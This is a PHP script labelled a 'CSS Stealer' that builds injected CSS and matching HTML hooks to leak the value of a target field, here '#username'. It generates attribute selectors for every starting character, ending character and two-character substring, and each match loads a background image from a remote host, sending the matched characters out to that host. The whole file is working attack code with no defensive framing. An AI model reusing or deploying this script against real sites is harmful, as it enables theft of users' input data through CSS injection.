<?php
    # CSS Stealer helper script to generate injected CSS and corresponding HTML
    # which targets a data element

    $ele    = "#username";                  # Target element
    $remote = "http://remote.host";     # Remote host

    # Alphabet [A-Za-z0-9]
    $chars = [  'a'=>'a','b'=>'b','c'=>'c','d'=>'d','e'=>'e','f'=>'f','g'=>'g','h'=>'h','i'=>'i','j'=>'j','k'=>'k','l'=>'l','m'=>'m',
                'n'=>'n','o'=>'o','p'=>'p','q'=>'q','r'=>'r','s'=>'s','t'=>'t','u'=>'u','v'=>'v','w'=>'w','x'=>'x','y'=>'y','z'=>'z',
                'A'=>'A','B'=>'B','C'=>'C','D'=>'D','E'=>'E','F'=>'F','G'=>'G','H'=>'H','I'=>'I','J'=>'J','K'=>'K','L'=>'L','M'=>'M',
                'N'=>'N','O'=>'O','P'=>'P','Q'=>'Q','R'=>'R','S'=>'S','T'=>'T','U'=>'U','V'=>'V','W'=>'W','X'=>'X','Y'=>'Y','Z'=>'Z',
                '0'=>'xx0','1'=>'xx1','2'=>'xx2','3'=>'xx3','4'=>'xx4','5'=>'xx5','6'=>'xx6','7'=>'xx7','8'=>'xx8','9'=>'xx9'];

    $_css  = '';
    $_html = '';
    
    $i=0;
    foreach($chars as $cha => $_cha)
    {
        $selector = $cha;
        if($cha != $_cha)
        {
            $selector = $_cha;
        }

        # starts with $cha
        $_css .= $ele .'[value^="'. $cha .'"]~#'. $selector .'_{background:url("'. $remote . $cha .'_");}';
        $_html .= '<a id="'. $selector .'_">';

        # ends with $cha
        $_css .= $ele .'[value$="'. $cha .'"]~#_'. $selector .'{background:url("'. $remote .'_'. $cha .'");}';
        $_html .= '<a id="_'. $selector .'">';

        $i+=2;

        foreach($chars as $chr => $_chr)
        {
            $c  = $cha . $chr;
            $_c = $_cha . $_chr;
            
            $selector = $c;
            if($c != $_c)
            {
                $selector = $_c;
            }
            
            # input contains $c
            $_css .= $ele .'[value*="'. $c .'"]~#'. $selector .'{background:url("'. $remote . $c .'");}';
            
            # html hook
            $_html .= '<a id="'. $selector .'">';

            $i++;
        }
    }
    
    if(isset($_GET['css'])) echo $_css;

?>